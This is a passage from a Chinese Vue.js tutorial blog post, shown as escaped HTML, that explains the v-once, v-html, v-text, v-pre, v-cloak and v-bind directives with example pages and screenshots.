            name: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;summer&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            age: &lt;/span&gt;&lt;span&gt;18&lt;/span&gt;&lt;span&gt;
        }
    });
&lt;/span&gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;同样是打印输出{{name}},第二个加了v-once, 加了这个是什么含义呢?&lt;/p&gt;
&lt;p&gt;我们先来看看效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219141957004-1908607953.png&quot; width=&quot;150&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 然后, 我们修改在控制台name的值&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219142102751-189823086.png&quot; width=&quot;400&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 我们发现, 在控制台将app.name的值修改了以后, 加了v-once的元素值没有跟随改变. &lt;/p&gt;
&lt;p&gt;v-once的意思就是: 在第一次的时候设置完值以后, 后面的修改不会影响到这个元素值&lt;/p&gt;

&lt;h2&gt;4. &lt;strong&gt;v-html : 把html代码解析，只显示内容&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt; 有时, 我们从服务器请求到的数据本身就是一个HTML代码, 如果我们直接通过{{}}来输出, 就将html代码直接输出了, 但是我们希望它能够按照html进行解析, 然后显示解析后的结果.这时, 我们可以使用v-html?&lt;/p&gt;
&lt;p&gt;看下面的代码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;en&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

&amp;lt;div id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
   &lt;span&gt;&lt;strong&gt; &amp;lt;h2&amp;gt;{{url}}&amp;lt;/h2&amp;gt;
    &amp;lt;h2 v-html=&quot;url&quot;&amp;gt;url &amp;lt;/h2&amp;gt;&lt;/strong&gt;&lt;/span&gt;
&amp;lt;/div&amp;gt;

&amp;lt;script src=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../js/vue.js&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;
    &lt;span&gt;var&lt;/span&gt; app = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
        el: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        data: {
            &lt;strong&gt;url: &lt;/strong&gt;&lt;/span&gt;&lt;strong&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;a href='http://www.baidu.com'&amp;gt;百度&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;

        }
    });
&lt;/span&gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里打印了两个url, 我们来看看效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219143848677-569638248.png&quot; width=&quot;400&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 第一个是将url的内容直接输出了, 而第二个是解析了html代码后输出的.&lt;/p&gt;

&lt;h2&gt;5. &lt;strong&gt;v-text: 显示文本&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;显示文本内容, 通常和{{}}的效果是一样的, 我们使用{{}}的频率会更高一些, 因为v-text会有一些局限性&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;en&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

&amp;lt;div id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &lt;span&gt;&lt;strong&gt;&amp;lt;h2&amp;gt;{{name}}, 你好&amp;lt;/h2&amp;gt;
    &amp;lt;h2 v-text=&quot;name&quot;&amp;gt;, 你好 &amp;lt;/h2&amp;gt;&lt;/strong&gt;&lt;/span&gt;
&amp;lt;/div&amp;gt;

&amp;lt;script src=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../js/vue.js&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;
    &lt;span&gt;var&lt;/span&gt; app = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
        el: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        data: {
            name: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;summer&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        }
    });
&lt;/span&gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们看到, 使用{{name}} 后面还可以跟其他内容. 但是使用v-text, 后面更得内容会被覆盖掉, 来看效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219145035111-826003356.png&quot; width=&quot;200&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;h2&gt;6.&lt;strong&gt;v-pre: 原样输出&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;v-pre用于跳过这个元素和他的子元素的编译过程, 显示的是原本的内容.&lt;/p&gt;
&lt;p&gt;我们来看一下案例&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;en&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

&amp;lt;div id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
   &lt;span&gt;&lt;strong&gt; &amp;lt;h2&amp;gt;{{name}}&amp;lt;/h2&amp;gt;
    &amp;lt;h2 v-pre&amp;gt; {{name}}&amp;lt;/h2&amp;gt;&lt;/strong&gt;&lt;/span&gt;
&amp;lt;/div&amp;gt;

&amp;lt;script src=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../js/vue.js&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;
    &lt;span&gt;var&lt;/span&gt; app = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
        el: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        data: {
            name: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;summer&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        }
    });
&lt;/span&gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们看到, 一个元素没有加v-pre, 第二个元素加了v-pre, 那么效果是什么样的呢?&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219145715180-1928339095.png&quot; width=&quot;150&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 使用了v-pre的元素跳过了编译过程, 原样输出了元素的内容. &lt;/p&gt;
&lt;h2&gt;7.&lt;strong&gt;v-cloak: &lt;/strong&gt; 解决文本闪烁问题&lt;/h2&gt;
&lt;p&gt;在真实的项目中, 内容很多, 有可能在加载new Vue()对象之前卡住了. 而页面是从上到下加载的, div加载完了,显示的就是{{message}}, 这是new Vue()卡住了, 那么用户就会看到{{message}}这样的文字,&lt;/p&gt;
&lt;p&gt;其实这样是很不友好的. 为了避免这种情况, 我们可以使用vue的v-cloak指令. 在vue加载之前, 先将其遮住. 效果如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219163452534-1624459280.gif&quot; alt=&quot;&quot; width=&quot;131&quot; height=&quot;68&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 这个问题, 可以使用vue的v-cloak来解决. 先来看看代码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;en&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
    &amp;lt;style&amp;gt;&lt;span&gt;&lt;strong&gt;
        [v-cloak] {
            display: none;
        }
    &lt;/strong&gt;&lt;/span&gt;&amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

&lt;strong&gt;&amp;lt;div id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;v-cloak&amp;gt;&lt;/span&gt;{{message}}&amp;lt;/div&amp;gt;&lt;/strong&gt;
&amp;lt;script src=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../js/vue.js&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;&lt;strong&gt;&lt;span&gt;
    setTimeout(function(){
        &lt;/span&gt;&lt;/strong&gt;&lt;span&gt;var&lt;/span&gt; app = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
            el: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            data: {
                message: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            }
        });
    &lt;strong&gt;}, &lt;/strong&gt;&lt;/span&gt;&lt;strong&gt;&lt;span&gt;1000&lt;/span&gt;&lt;span&gt;);

&lt;/span&gt;&lt;/strong&gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其他设置都一样, 不一样的是, 在div标签里增加了v-cloak指令. 然后给这个指令元素设置了一个style样式. &lt;/p&gt;
&lt;p&gt;在这里, 我们还使用setTimeout来&lt;span&gt;&lt;strong&gt;模拟延时1秒&lt;/strong&gt;&lt;/span&gt;显示的状况. 在样式表中设置一个属性[v-cloak]的display为none不显示. 当new Vue()代码执行以后, 就是将元素中v-cloak删除掉, 这样样式也不起作用.&lt;/p&gt;
&lt;p&gt;我们来看看效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219164037130-1523841304.gif&quot; alt=&quot;&quot; width=&quot;109&quot; height=&quot;62&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 刚开始, 没有加载new Vue()元素的时候, 就不显示div的内容. 加载了new Vue()对象以后, vue会自动将v-cloak指令删除, 这样div的内容就显示出来了.&lt;/p&gt;


&lt;p&gt;上面的插值操作, 通常都是插入到&lt;span&gt;&lt;strong&gt;模板的内容&lt;/strong&gt;&lt;/span&gt;中.&lt;/p&gt;
&lt;p&gt;Mastache语法也是插入值到模板的内容. 但是不能插入到属性.&lt;/p&gt;
&lt;p&gt;可是, 除了内容, 有时我们希望动态绑定a标签的src元素, 或者img的src元素, 这个时候, 我们可以用到v-bind指令&lt;/p&gt;
&lt;h2&gt;1. v-bind基本用法&lt;/h2&gt;
&lt;p&gt;v-bind指令有两种写法&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;strong&gt;第一种:&lt;/strong&gt; &amp;lt;a v-bind:href=&quot;url&quot;&amp;gt;Hello&amp;lt;/a&amp;gt;&lt;span readability=&quot;2&quot;&gt;&lt;strong&gt;
第二种:&lt;/strong&gt; &amp;lt;a :href=&quot;url&quot;&amp;gt;Hello&amp;lt;/a&amp;gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;第二种写法是v-bind的缩写.&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如下示例: &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;en&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;title&amp;gt;v-bind指令&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;div id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &lt;strong&gt;&amp;lt;img width=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100px&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; height=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100px&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;v-bind:src=&quot;src&quot;&amp;gt;&lt;/span&gt;&amp;lt;/img&amp;gt;
    &amp;lt;a &lt;span&gt;v-bind:href=&quot;href&quot;&lt;/span&gt;&amp;gt;百度&amp;lt;/a&amp;gt;&lt;/strong&gt;
&amp;lt;/div&amp;gt;

&amp;lt;script src=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../js/vue.js&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;
    &lt;span&gt;var&lt;/span&gt; app = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
        el: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        data: {
            message: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            src: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg14.360buyimg.com%2Fn0%2Fjfs%2Ft2740%2F163%2F951722573%2F619210%2Fcd4a7b33%2F572df1b5N85de4909.png&amp;amp;refer=http%3A%2F%2Fimg14.360buyimg.com&amp;amp;app=2002&amp;amp;size=f9999,10000&amp;amp;q=a80&amp;amp;n=0&amp;amp;g=0n&amp;amp;fmt=jpeg?sec=1616318081&amp;amp;t=f8e815503efff6d6871f732bea62c68f&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            href:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;http://www.baidu.com&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
        }
    });
&lt;/span&gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们在data中定义了src和href两个属性, 如果想要赋值给img表示和a标签, 不能直接像下面这么写. 这样会被直接输出&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;img width=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100px&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; height=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100px&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;src=&quot;{{src}}&quot;&lt;/strong&gt;&lt;/span&gt;&amp;gt;&amp;lt;/img&amp;gt;
    
&amp;lt;a &lt;span&gt;&lt;strong&gt;href=&quot;{{href}}&quot;&lt;/strong&gt;&lt;/span&gt;&amp;gt;百度&amp;lt;/a&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219172008028-353237643.png&quot; width=&quot;400&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;这样肯定是不可以的. 这时需要使用v-bind&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;img width=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100px&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; height=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100px&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&lt;strong&gt; v-bind:src=&quot;src&quot;&lt;/strong&gt;&lt;/span&gt;&amp;gt;&amp;lt;/img&amp;gt;
    
&amp;lt;a &lt;strong&gt;&lt;span&gt;v-bind:href=&quot;href&quot;&lt;/span&gt;&lt;/strong&gt;&amp;gt;百度&amp;lt;/a&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219172147267-60167105.png&quot; width=&quot;800&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;我们还可以是用v-bind的缩写, 在实际项目开发中, 使用缩写的概率更大&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;img width=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100px&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; height=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;100px&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;:src=&quot;src&quot;&lt;/strong&gt;&lt;/span&gt;&amp;gt;&amp;lt;/img&amp;gt;
    
&amp;lt;a &lt;span&gt;&lt;strong&gt;:href=&quot;href&quot;&lt;/strong&gt;&lt;/span&gt;&amp;gt;百度&amp;lt;/a&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;2. v-bind动态绑定class(对象语法)&lt;/h2&gt;
&lt;p&gt;有些class对象需要动态赋值. 比如: 在列表页, 每条记录有一个复选框, 勾选复选框显示勾选样式, 取消勾选显示取消勾选样式. 这种情况使用vue怎么写呢?&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&amp;lt;a :href=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;url&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;:class=&quot;{key:value, key:value }&quot;&lt;/strong&gt;&lt;/span&gt;&amp;gt;Hello&amp;lt;/a&amp;gt;&lt;strong&gt;&lt;span&gt;

在class属性中, 我们可以使用{}来定义多个属性. 语法结构&lt;span&gt;{key: value, key:value}&lt;/span&gt;, key是样式名称. value值是true或者false
如果是true就启用样式, false就禁用样式&lt;/span&gt;&lt;/strong&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;来看下面的案例:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;en&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
    &lt;strong&gt;&amp;lt;style&amp;gt;&lt;span&gt;
        .active {
            color: red;
        }
    &lt;/span&gt;&amp;lt;/style&amp;gt;&lt;/strong&gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&lt;strong&gt;&amp;lt;div id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;h2 &lt;span&gt;v-bind:class=&quot;{active: isActive}&quot;&lt;/span&gt;&amp;gt;{{message}}&amp;lt;/h2&amp;gt;
&amp;lt;/div&amp;gt;&lt;/strong&gt;

&amp;lt;script src=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../js/vue.js&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;
    &lt;span&gt;var&lt;/span&gt; app = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
        el: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        data: {
            message: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
           &lt;strong&gt; isActive: &lt;/strong&gt;&lt;/span&gt;&lt;strong&gt;&lt;span&gt;true&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;
        }
    });
&lt;/span&gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在data中定义了一个isActive,  class对象中如何写的呢?&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
 &amp;lt;h2 &lt;span&gt;&lt;strong&gt;v-bind:class&lt;/strong&gt;&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;{active: isActive}&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;{{message}}&amp;lt;/h2&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;active指的是style样式的名称, isActive是取data中的值. 这个结果就是显示active样式, 效果如下:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219175657699-613584706.png&quot; width=&quot;300&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;h3&gt; &lt;span&gt;还可以使用methods方法来控制class的显示.&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;a :href=&quot;url&quot; class=&quot;title&quot; &lt;strong&gt;:class=&quot;getClasses()&quot;&lt;/strong&gt;&amp;gt;Hello&amp;lt;/a&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;案例: 有一个按钮, 点击一下显示红色, 再点击一下没有颜色. &lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;en&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
    &amp;lt;style&amp;gt;&lt;span&gt;
        .active {
            color: red;
        }
    &lt;/span&gt;&amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;div id=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
    &amp;lt;h2 v-bind:&lt;span&gt;class&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{active: isActive}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;{{message}}&amp;lt;/h2&amp;gt;
    &lt;span&gt;&lt;strong&gt;&amp;lt;button :class = &quot;{active: isActive}&quot; v-on:click=&quot;getActive&quot;&amp;gt;按钮&amp;lt;/button&amp;gt;&lt;/strong&gt;&lt;/span&gt;
&amp;lt;/div&amp;gt;

&amp;lt;script src=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../js/vue.js&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;
    &lt;span&gt;var&lt;/span&gt; app = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Vue({
        el: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;#app&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        data: {
            message: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            isActive: &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;
        },
        methods:{
           &lt;span&gt;&lt;strong&gt; getActive: function() {
                &lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;this.isActive = !this&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt;.isActive;
            }&lt;/strong&gt;&lt;/span&gt;
        }
    });
&lt;/span&gt;&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;来看看效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1187916/202102/1187916-20210219181819411-952169037.gif&quot; alt=&quot;&quot; width=&quot;118&quot; height=&quot;123&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;2) v-bind动态绑定class:(数组语法)&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
